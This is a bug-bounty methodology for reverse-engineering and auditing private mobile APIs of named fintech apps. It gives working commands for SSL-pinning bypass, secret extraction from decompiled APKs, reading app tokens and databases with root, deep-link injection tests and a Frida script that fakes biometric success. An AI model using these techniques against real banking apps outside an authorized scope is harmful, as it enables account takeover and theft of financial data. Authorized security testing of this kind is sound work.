# Mobile API Reverse Engineering — Hunt Methodology

Systematic methodology for extracting, mapping, and auditing private APIs from mobile applications. Designed for fintech/neobank targets where 80%+ of the API surface is only accessible via the mobile app.

**Pipeline integration:** This is the missing recon layer for FINANCIAL-SYSTEMS-HUNTING-SPEC Track 1 (fintech bounties). Outputs feed directly into §FIN-1 through §FIN-4, JWT-ARSENAL, and DEFI-FULLSTACK §F1.

**Why this matters:** Web-facing APIs are documented, public, and heavily tested by other bounty hunters. Mobile APIs are undocumented, private, and rarely tested. The same fintech that has 50 researchers hitting their web API has 2-3 hitting their mobile API. The competition delta is massive.

---

## Infrastructure Setup

### 0.1 Android Emulator

```bash
# === Option A: Android Studio AVD (recommended for stability) ===
# Download Android Studio → AVD Manager → Create Virtual Device
# Choose: Pixel 6 (or similar), API 33 (Android 13), x86_64 image
# CRITICAL: Use a Google APIs image WITHOUT Google Play Store
# Google Play images have locked system partitions → can't install root CA

# Start emulator
emulator -avd Pixel_6_API_33 -writable-system

# === Option B: Genymotion (faster, better for repeated use) ===
# Commercial but free for personal use
# Pre-rooted, easier cert installation

# === Option C: Real device (most realistic but requires physical device) ===
# Rooted Android device with Magisk
# ADB debugging enabled
```

- [ ] **Emulator running** with writable system partition
- [ ] **ADB connection** verified: `adb devices` shows device
- [ ] **Root access** available: `adb root` or Magisk installed

### 0.2 Certificate Pinning Bypass Toolkit

```bash
# === Frida (dynamic instrumentation framework) ===
pip install frida-tools --break-system-packages

# Download frida-server for Android (match your arch: x86_64 for emulator, arm64 for device)
# https://github.com/frida/frida/releases
wget https://github.com/frida/frida/releases/download/16.x.x/frida-server-16.x.x-android-x86_64.xz
xz -d frida-server-*.xz
chmod +x frida-server-*

# Push to device and start
adb push frida-server-* /data/local/tmp/frida-server
adb shell "chmod 755 /data/local/tmp/frida-server"
adb shell "/data/local/tmp/frida-server &"

# Verify
frida-ps -U  # Should list running processes on device

# === Objection (Frida-powered mobile exploration toolkit) ===
pip install objection --break-system-packages

# === Common Frida scripts ===
# Universal SSL pinning bypass
# https://github.com/httptoolkit/frida-android-unpinning
wget https://raw.githubusercontent.com/httptoolkit/frida-android-unpinning/main/frida-script.js \
  -O ssl-unpin.js
```

- [ ] **frida-server** running on device: `frida-ps -U` lists processes
- [ ] **objection** installed: `objection version` works
- [ ] **SSL unpin script** downloaded and ready

### 0.3 Proxy Setup

```bash
# === mitmproxy (primary — for capture + swagger generation) ===
pip install mitmproxy --break-system-packages

# Generate mitmproxy CA certificate
mitmproxy  # Start once to generate certs, then quit
# Cert location: ~/.mitmproxy/mitmproxy-ca-cert.cer

# Install cert on Android device
adb push ~/.mitmproxy/mitmproxy-ca-cert.cer /sdcard/
# On device: Settings → Security → Install certificates → select cert

# For Android 7+ (Nougat): system CA store requires root
# Convert to system cert format
openssl x509 -inform PEM -subject_hash_old -in ~/.mitmproxy/mitmproxy-ca-cert.cer | head -1
# Output: <hash> (e.g., c8750f0d)
cp ~/.mitmproxy/mitmproxy-ca-cert.cer <hash>.0
adb root
adb remount
adb push <hash>.0 /system/etc/security/cacerts/
adb shell "chmod 644 /system/etc/security/cacerts/<hash>.0"
adb reboot

# === Burp Suite (secondary — for active testing after capture) ===
# Export Burp CA cert → install same way as mitmproxy cert

# === Configure device proxy ===
# Emulator:
emulator -avd Pixel_6_API_33 -http-proxy http://127.0.0.1:8080

# Or set manually:
adb shell settings put global http_proxy 10.0.2.2:8080
# (10.0.2.2 = host machine from emulator's perspective)

# To remove proxy later:
adb shell settings put global http_proxy :0
```

- [ ] **mitmproxy CA cert** installed as system cert on device
- [ ] **Proxy configured** on device pointing to host:8080
- [ ] **HTTPS traffic visible** in mitmproxy when browsing on device

### 0.4 mitmproxy2swagger

```bash
# Install the OpenAPI spec generator
pip install mitmproxy2swagger --break-system-packages

# Verify
mitmproxy2swagger --help
```

### 0.5 App Installation & Preparation

```bash
# === Download target APK ===
# Option A: From device (if app already installed)
adb shell pm list packages | grep -i "revolut\|n26\|monzo\|wise"
adb shell pm path com.revolut.revolut
adb pull /data/app/<path>/base.apk target-app.apk

# Option B: From APK mirror sites
# apkpure.com, apkmirror.com — download specific versions

# Option C: From Google Play via command line
# pip install gplaydl (requires Google account cookies)

# === Install on emulator ===
adb install target-app.apk

# === Check for split APKs (common with App Bundles) ===
adb shell pm path com.target.app
# If multiple APKs listed → need all of them:
# adb shell pm path com.target.app | while read p; do
#   adb pull $(echo $p | cut -d: -f2)
# done
# adb install-multiple *.apk
```

- [ ] **Target app** installed and launchable on emulator
- [ ] **App version** documented (for version-specific vulns)

---

## Phase 1: Traffic Capture

### 1.1 Launch Capture Environment

```bash
# Terminal 1: Start mitmproxy in web interface mode
mitmweb --listen-port 8080 --set console_eventlog_verbosity=error

# Terminal 2: Start Frida SSL pinning bypass
frida -U -l ssl-unpin.js -f com.target.app --no-pause

# Or with objection (handles more pinning implementations):
objection -g com.target.app explore
# Inside objection:
# android sslpinning disable
# android root disable  (if app has root detection)
```

**If SSL pinning bypass fails:**

```bash
# === Escalation: more aggressive bypass ===

# 1. Try multiple Frida scripts
# https://github.com/m0bilesecurity/RMS-Runtime-Mobile-Security
# https://github.com/sensepost/objection/blob/master/agent/src/android/pinning.ts

# 2. Modify APK directly (if Frida can't hook)
apktool d target-app.apk -o decompiled/
# Edit network_security_config.xml to trust user certs:
# <network-security-config>
#   <base-config>
#     <trust-anchors>
#       <certificates src="system"/>
#       <certificates src="user"/>
#     </trust-anchors>
#   </base-config>
# </network-security-config>
apktool b decompiled/ -o patched.apk
# Sign: apksigner sign --ks my.keystore patched.apk
adb install patched.apk

# 3. Use HTTP Toolkit (automated, handles most pinning)
# https://httptoolkit.com/ — one-click Android interception
```

### 1.2 Systematic App Usage

**This is the most important phase.** Use every feature of the app methodically. Each action generates API calls that reveal the private API surface.

```
For each target fintech app, execute ALL of the following:

ACCOUNT & AUTH
  □ Sign up with new account (capture registration flow)
  □ Email/phone verification flow
  □ Login with credentials
  □ Login with biometrics (if available)
  □ Forgot password flow
  □ Change password
  □ Change email/phone
  □ Enable/disable 2FA
  □ Logout
  □ Login from "new device" (if detectable)

PROFILE & KYC
  □ View profile
  □ Edit profile (name, address, photo)
  □ Upload identity document (KYC)
  □ View KYC status
  □ Add/verify phone number
  □ Add/verify email

MONEY & ACCOUNTS
  □ View account balance
  □ View transaction history (scroll through pagination)
  □ View transaction details (tap individual transactions)
  □ View account statements
  □ Download statement (PDF/CSV)

TRANSFERS & PAYMENTS
  □ Add new beneficiary/payee
  □ Send money (domestic)
  □ Send money (international)
  □ Request money
  □ Set up recurring payment
  □ Cancel recurring payment
  □ Pay a bill
  □ Top up mobile

CARDS
  □ View card details
  □ Create virtual card
  □ Freeze/unfreeze card
  □ Set spending limits
  □ View PIN
  □ Change PIN
  □ Report lost/stolen
  □ Order physical card

ADDITIONAL FEATURES
  □ Currency exchange
  □ Crypto buy/sell (if available)
  □ Savings/pots/spaces
  □ Budgeting features
  □ Push notification settings
  □ Contact support / chat
  □ Referral program
  □ Rewards/cashback
```

- [ ] **All features exercised** — every button pressed, every flow completed
- [ ] **Multiple data states captured** — empty lists AND populated lists
- [ ] **Error states triggered** — invalid inputs, expired sessions, insufficient funds

### 1.3 Save Capture

```bash
# In mitmweb: File → Save → flows (save as target-app-flows)
# Or from command line:
mitmdump --listen-port 8080 -w target-app-flows
# (this saves automatically during capture)
```

---

## Phase 2: API Specification Generation

### 2.1 Generate OpenAPI Spec

```bash
# Convert captured flows to OpenAPI/Swagger spec
mitmproxy2swagger -i target-app-flows \
  -o spec.yaml \
  -p "https://api.target.com/" \
  -f flow

# If multiple API hosts were captured:
# Check which hosts appear in the flows
grep -oE 'https?://[a-zA-Z0-9.-]+' target-app-flows | sort -u

# Generate separate specs per host if needed:
mitmproxy2swagger -i target-app-flows \
  -o spec-main.yaml \
  -p "https://api.target.com/" \
  -f flow

mitmproxy2swagger -i target-app-flows \
  -o spec-auth.yaml \
  -p "https://auth.target.com/" \
  -f flow
```

### 2.2 Clean & Review Spec

```bash
# Open in text editor
# Remove non-API paths (static assets, analytics, crash reporting)
# Look for:
#   - /api/ paths → keep
#   - /v1/, /v2/, /v3/ paths → keep ALL versions
#   - /graphql → keep (flag for GraphQL testing)
#   - /_next/, /static/, /assets/ → remove
#   - analytics/tracking domains → remove (firebase, amplitude, segment, mixpanel)

# Count endpoints
grep -c "get:\|post:\|put:\|patch:\|delete:" spec.yaml

# List all paths
grep "^  /" spec.yaml | sort
```

### 2.3 API Version Enumeration

```bash
# From the spec, identify version patterns
grep -oE '/v[0-9]+/' spec.yaml | sort -u

# For each discovered version, test if OTHER versions exist
# This finds legacy API endpoints that may have unpatched vulns
API="https://api.target.com"
TOKEN="Bearer <captured_token>"

for v in v0 v1 v2 v3 v4 v5; do
  for endpoint in /accounts /users/me /transactions /cards; do
    code=$(curl -s -o /dev/null -w "%{http_code}" \
      "${API}/${v}${endpoint}" \
      -H "Authorization: ${TOKEN}" \
      --max-time 5 2>/dev/null)
    [ "$code" != "404" ] && [ "$code" != "000" ] && \
      echo "[VERSION] ${v}${endpoint} → ${code}"
  done
done
```

- [ ] **All API versions** enumerated — legacy versions documented
- [ ] **Legacy endpoints responding** flagged for deep testing (improper inventory management)

### 2.4 Import to Postman

```
1. Open Postman → Import → File → select spec.yaml
2. Organize collection by function (auth, accounts, transfers, cards)
3. Create environment variables:
   - {{baseUrl}} = https://api.target.com
   - {{token}} = <captured JWT>
   - {{userId}} = <your user ID from captured traffic>
4. Set collection-level auth: Bearer Token → {{token}}
5. Run Collection Runner → verify all endpoints respond
6. Fix any broken requests (missing params, wrong content-type)
```

---

## Phase 3: Static Analysis (APK)

### 3.1 APK Decompilation & Secret Extraction

```bash
# === Decompile APK ===
apktool d target-app.apk -o decompiled/
# Also extract Java source:
# jadx (recommended)
jadx target-app.apk -d jadx-output/
# Or: dex2jar + JD-GUI for older apps

# === Secret extraction ===
SRC="jadx-output/"

# API keys and tokens
grep -rn "api[_-]?key\|apikey\|api[_-]?secret" "$SRC" --include="*.java" --include="*.kt" --include="*.xml"
grep -rn "Bearer \|Authorization:" "$SRC" --include="*.java" --include="*.kt"
grep -rn "sk_live\|pk_live\|sk_test\|pk_test" "$SRC" --include="*.java" --include="*.kt"  # Stripe keys

# Firebase / cloud config
grep -rn "firebase\|google-services\|AIza" "$SRC" --include="*.java" --include="*.kt" --include="*.xml" --include="*.json"
grep -rn "amazonaws\|s3://\|cognito\|arn:" "$SRC" --include="*.java" --include="*.kt" --include="*.xml"

# Hardcoded credentials
grep -rn "password\|passwd\|secret\|credential" "$SRC" --include="*.java" --include="*.kt" | grep -i "=\|:\|\"" | head -30

# Internal/staging URLs
grep -rn "staging\.\|dev\.\|test\.\|internal\.\|preprod\." "$SRC" --include="*.java" --include="*.kt" --include="*.xml"
grep -rn "https\?://[a-z0-9.-]*\(staging\|dev\|test\|internal\|preprod\)" "$SRC" --include="*.java" --include="*.kt"

# Certificate pinning configuration (understand what's pinned)
grep -rn "CertificatePinner\|ssl[_-]?pin\|pin-set\|sha256/" "$SRC" --include="*.java" --include="*.kt" --include="*.xml"

# Encryption keys / secrets
grep -rn "AES\|DES\|RSA\|SecretKeySpec\|Cipher\.getInstance" "$SRC" --include="*.java" --include="*.kt"
grep -rn "HMAC\|Mac\.getInstance\|HmacSHA" "$SRC" --include="*.java" --include="*.kt"

# WebSocket endpoints
grep -rn "wss\?://\|WebSocket\|socket\.io\|stomp" "$SRC" --include="*.java" --include="*.kt"

# Deep links / custom URL schemes
grep -rn "scheme=\"\|android:scheme\|deeplink\|applink" "$SRC" --include="*.xml"
cat decompiled/AndroidManifest.xml | grep -A5 "intent-filter" | grep "scheme\|host\|path"
```

- [ ] **API keys** — any hardcoded keys found? Live keys (sk_live) = CRITICAL
- [ ] **Internal URLs** — staging/dev endpoints accessible from the internet?
- [ ] **Encryption implementation** — hardcoded keys? Weak algorithms?
- [ ] **Deep links** — exploitable for redirect/phishing?
- [ ] **WebSocket endpoints** — additional API surface to test

### 3.2 Network Security Config Analysis

```bash
# Check what the app trusts
cat decompiled/res/xml/network_security_config.xml 2>/dev/null

# What to look for:
# <certificates src="user"/> → app trusts user-installed certs (easier to intercept)
# <certificates src="system"/> → only system certs (need root to add proxy cert)
# <pin-set> → cert pinning configured (need Frida bypass)
# cleartextTrafficPermitted="true" → HTTP allowed (traffic interception without MITM)

# Check AndroidManifest for cleartext
grep "usesCleartextTraffic\|cleartextTrafficPermitted" decompiled/AndroidManifest.xml
```

### 3.3 Root / Emulator Detection Analysis

```bash
# Find root detection code (to understand bypass needs)
grep -rn "su\b\|Superuser\|supersu\|magisk\|root.*detect\|isRooted\|checkRoot" "$SRC" --include="*.java" --include="*.kt"

# Find emulator detection
grep -rn "Build\.FINGERPRINT\|generic\|goldfish\|sdk_gphone\|isEmulator\|detectEmulator" "$SRC" --include="*.java" --include="*.kt"

# Find integrity checks (SafetyNet/Play Integrity)
grep -rn "SafetyNet\|PlayIntegrity\|attestation\|integrity.*token" "$SRC" --include="*.java" --include="*.kt"
```

---

## Phase 4: Vulnerability Testing

At this point you have:
- Complete API specification (OpenAPI/Swagger)
- All endpoints imported into Postman
- Valid auth token
- APK decompiled with secrets extracted
- Legacy API versions identified

Now apply the existing checklists with the mobile-specific additions:

### 4.1 Apply Existing Checklists

```
1. DEFI-FULLSTACK §F1 (API Surface)
   → Already done via Phase 2 — endpoint discovery complete
   → Run §F1.2 (auth classification) on ALL discovered endpoints
   → Run §F1.3 (unauth write endpoints) — test without token

2. JWT-ARSENAL
   → Decode captured JWT from login response
   → Run Tool 8 (config-to-vuln mapper) on identified JWT lib
   → Test alg:none, type confusion, key confusion

3. FINANCIAL-SYSTEMS-HUNTING §FIN-1 through §FIN-4
   → Payment flow logic (race conditions, rounding, negative amounts)
   → KYC/identity bypass
   → Card exploitation
   → Notification manipulation

4. PIPELINE-EXPANSION §F3.7 (WebSocket)
   → Test any WebSocket endpoints discovered in Phase 3.1

5. NEXTJS-HUNT (if web dashboard detected)
   → Some fintechs serve a web dashboard alongside mobile
   → Apply full Next.js checklist if detected
```

### 4.2 Mobile-Specific Vulnerability Checks

#### §MOB-1: Deep Link Exploitation

```bash
# From Phase 3.1, you have the app's deep link scheme
# Example: targetapp://callback?token=XXX

# Test: can deep links be used to bypass auth?
adb shell am start -a android.intent.action.VIEW \
  -d "targetapp://transfer?to=attacker&amount=1000"

# Test: open redirect via deep link
adb shell am start -a android.intent.action.VIEW \
  -d "targetapp://redirect?url=https://evil.com"

# Test: can deep links inject parameters?
adb shell am start -a android.intent.action.VIEW \
  -d "targetapp://verify?token=INJECTED_TOKEN"
```

- [ ] **Deep links** — can they trigger sensitive actions without auth?
- [ ] **Deep link parameter injection** — can attacker control parameters?
- [ ] **OAuth callback deep link** — can attacker intercept auth code?

#### §MOB-2: Local Data Storage

```bash
# Check what the app stores locally (after using the app)

# Shared preferences (often contains tokens, settings)
adb shell "run-as com.target.app cat shared_prefs/*.xml" 2>/dev/null
# If run-as fails (non-debuggable), use root:
adb shell "su -c 'cat /data/data/com.target.app/shared_prefs/*.xml'"

# SQLite databases
adb shell "su -c 'ls /data/data/com.target.app/databases/'"
adb pull /data/data/com.target.app/databases/target.db
sqlite3 target.db ".tables"
sqlite3 target.db "SELECT * FROM users LIMIT 5;"

# Files / cache
adb shell "su -c 'ls -la /data/data/com.target.app/files/'"
adb shell "su -c 'ls -la /data/data/com.target.app/cache/'"

# Keystore (Android Keystore should be used for secrets)
grep -rn "KeyStore\|AndroidKeyStore\|setUserAuthenticationRequired" "$SRC" --include="*.java" --include="*.kt"
# If secrets are in SharedPreferences instead of Keystore → finding
```

- [ ] **Tokens in SharedPreferences** — should be in Android Keystore
- [ ] **Unencrypted database** — contains PII or financial data?
- [ ] **Cached sensitive data** — cleared on logout?

#### §MOB-3: Biometric Authentication Bypass

```bash
# If the app uses fingerprint/face for auth, check:

# 1. Is biometric auth enforced server-side or client-side only?
# Client-side only = bypassable with Frida

# Frida script to bypass biometric
frida -U -l - -f com.target.app <<'EOF'
Java.perform(function() {
    var BiometricPrompt = Java.use('android.hardware.biometrics.BiometricPrompt');
    BiometricPrompt.authenticate.overload(
        'android.os.CancellationSignal',
        'java.util.concurrent.Executor',
        'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback'
    ).implementation = function(cancel, executor, callback) {
        console.log("[*] Biometric auth intercepted, calling onAuthenticationSucceeded");
        // Create fake result and call success callback
        callback.onAuthenticationSucceeded(null);
    };
});
EOF

# 2. Does bypassing biometric give full access to the account?
# Or is there a server-side challenge that still needs to be answered?
# If Frida bypass grants full access → biometric is client-side only → finding
```

- [ ] **Biometric enforcement** — server-side or client-side only?
- [ ] **Biometric bypass** — Frida can skip auth and access sensitive features?

#### §MOB-4: Intent & Broadcast Interception

```bash
# Exported components (accessible by other apps)
grep -E "exported=\"true\"|android:exported" decompiled/AndroidManifest.xml

# Exported activities (can be launched by other apps)
grep -B5 "exported=\"true\"" decompiled/AndroidManifest.xml | grep "activity\|receiver\|service\|provider"

# Test: can exported activities bypass login?
# Find exported activities:
aapt dump xmltree target-app.apk AndroidManifest.xml | grep -B2 "exported.*true" | grep "activity"
# Launch directly:
adb shell am start -n com.target.app/.InternalActivity

# Broadcast receivers — can other apps send them sensitive intents?
grep -A10 "receiver.*exported=\"true\"" decompiled/AndroidManifest.xml
```

- [ ] **Exported components** — any sensitive activities/services exported?
- [ ] **Direct activity launch** — can internal screens be accessed without auth?
- [ ] **Broadcast receivers** — accepting intents from any app?

#### §MOB-5: Screenshot & Screen Recording Protection

```bash
# Check if app prevents screenshots on sensitive screens
grep -rn "FLAG_SECURE\|setFlags.*SECURE\|WindowManager.*FLAG" "$SRC" --include="*.java" --include="*.kt"

# If FLAG_SECURE is NOT set on screens showing:
# - Account balance
# - Card numbers/CVV
# - Transaction details
# - OTP/2FA codes
# → Finding: sensitive data exposed to screenshots/screen recording
# This matters for banking apps under PCI-DSS

# Test: take screenshot on sensitive screen
adb shell screencap /sdcard/screenshot.png
adb pull /sdcard/screenshot.png
# If screenshot contains sensitive data → finding
```

- [ ] **FLAG_SECURE** set on all screens displaying financial data?
- [ ] **App switcher** — does the app thumbnail show sensitive data?

---

## Phase 5: Reporting

### 5.1 Evidence Collection

```
For each finding, collect:

1. API request/response (from Burp or mitmproxy)
   - Full HTTP request with headers
   - Full HTTP response with body
   - Timestamp

2. Screenshots/recordings
   - Screen recording of the exploit flow
   - Before/after screenshots

3. APK evidence (if relevant)
   - Decompiled code showing the vulnerability
   - File path and line number

4. Impact quantification
   - Number of users potentially affected
   - Data types exposed (PII, financial, auth tokens)
   - Regulatory impact (PSD2, PCI-DSS, GDPR)
```

### 5.2 Report Format

```
Standard format for HackerOne/Bugcrowd/Intigriti:

1. Title: [Vuln Type] in [Endpoint/Feature] allows [Impact]
2. Severity: Based on platform's severity scale
3. Affected asset: com.target.app v[X.Y.Z] + API endpoint
4. Steps to reproduce:
   - Environment setup (emulator, proxy, Frida)
   - Exact steps to trigger
   - Expected vs actual behavior
5. Impact: What can an attacker do? Quantify.
6. Proof of Concept: Request/response, screenshots, video
7. Remediation: Specific fix recommendation
8. References: OWASP MASVS, PSD2 articles, PCI-DSS requirements
```

---

## Complete Workflow — Per Target

```
For each fintech mobile app target:

SETUP (1-2h first time, 15 min after)
  1. Emulator + Frida + mitmproxy ready              → §0.1-0.4
  2. Install target app                               → §0.5
  3. Start capture environment                        → §1.1

CAPTURE (45-90 min)
  4. Use every app feature systematically             → §1.2
  5. Save capture flows                               → §1.3

MAPPING (30-60 min)
  6. Generate OpenAPI spec                            → §2.1
  7. Clean spec, count endpoints                      → §2.2
  8. Enumerate API versions                           → §2.3
  9. Import to Postman, verify all endpoints          → §2.4

STATIC ANALYSIS (30-60 min)
  10. Decompile APK, extract secrets                  → §3.1
  11. Analyze network security config                 → §3.2
  12. Identify root/emulator detection                → §3.3

TESTING (2-4h)
  13. Apply existing checklists                       → §4.1
      - DEFI-FULLSTACK §F1 (API surface)
      - JWT-ARSENAL (auth tokens)
      - FINANCIAL-SYSTEMS §FIN-1-4 (payment logic)
  14. Mobile-specific checks                          → §4.2
      - §MOB-1: Deep link exploitation
      - §MOB-2: Local data storage
      - §MOB-3: Biometric bypass
      - §MOB-4: Intent/broadcast interception
      - §MOB-5: Screenshot protection

REPORT (30 min per finding)
  15. Collect evidence                                → §5.1
  16. Write report                                    → §5.2
  17. Kill Gate → Pre-Flight → Submit

Total: 5-8h per target (first time)
       3-5h per target (after setup is ready)
```

---

## Tool Inventory

| Tool | Purpose | Install |
|------|---------|---------|
| Android Studio / emulator | Android VM | `apt install android-studio` or download |
| ADB | Device communication | `apt install adb` |
| Frida | Dynamic instrumentation | `pip install frida-tools` |
| frida-server | On-device Frida agent | GitHub releases (match arch) |
| Objection | Mobile exploration toolkit | `pip install objection` |
| mitmproxy / mitmweb | Traffic interception | `pip install mitmproxy` |
| mitmproxy2swagger | Flow → OpenAPI conversion | `pip install mitmproxy2swagger` |
| Burp Suite | Active testing & repeater | Download from PortSwigger |
| apktool | APK decompilation (smali) | `apt install apktool` |
| jadx | APK decompilation (Java) | GitHub releases |
| Postman | API organization & testing | Download from postman.com |
| aapt | APK analysis | Part of Android SDK |
| sqlite3 | Database inspection | `apt install sqlite3` |
| HTTP Toolkit | Automated interception (fallback) | httptoolkit.com |

---

## Fintech Priority Targets for Mobile Recon

| App | Package Name | API Surface | Est. Endpoints | Priority |
|-----|-------------|-------------|----------------|----------|
| Revolut | com.revolut.revolut | Massive (crypto, FX, cards, savings, insurance) | 500+ | P1 |
| N26 | de.number26.android | Banking + spaces + insurance | 200+ | P1 |
| Monzo | co.uk.getmondo | Banking + pots + flex | 200+ | P1 |
| Wise | com.transferwise.android | FX transfers + multi-currency + cards | 300+ | P1 |
| Cash App | com.squareup.cash | P2P + Bitcoin + stocks + cards | 300+ | P1 |
| Mercury | com.mercury.app | Business banking + cards + treasury | 150+ | P1 |
| Chime | com.onedebit.chime | Banking + savings + credit builder | 150+ | P2 |
| Robinhood | com.robinhood.android | Trading + crypto + cards | 400+ | P1 |
| SoFi | com.sofi.mobile | Banking + invest + loans + crypto | 300+ | P2 |
| Brex | com.brex.mobile | Corporate cards + expenses + treasury | 200+ | P1 |
| Ramp | com.ramp.mobile | Corporate cards + expenses | 150+ | P2 |

**Start with:** Whichever app has the most generous bounty program AND the least number of researchers active on it. Check HackerOne/Bugcrowd "hackers thanked" count — lower count = less competition.
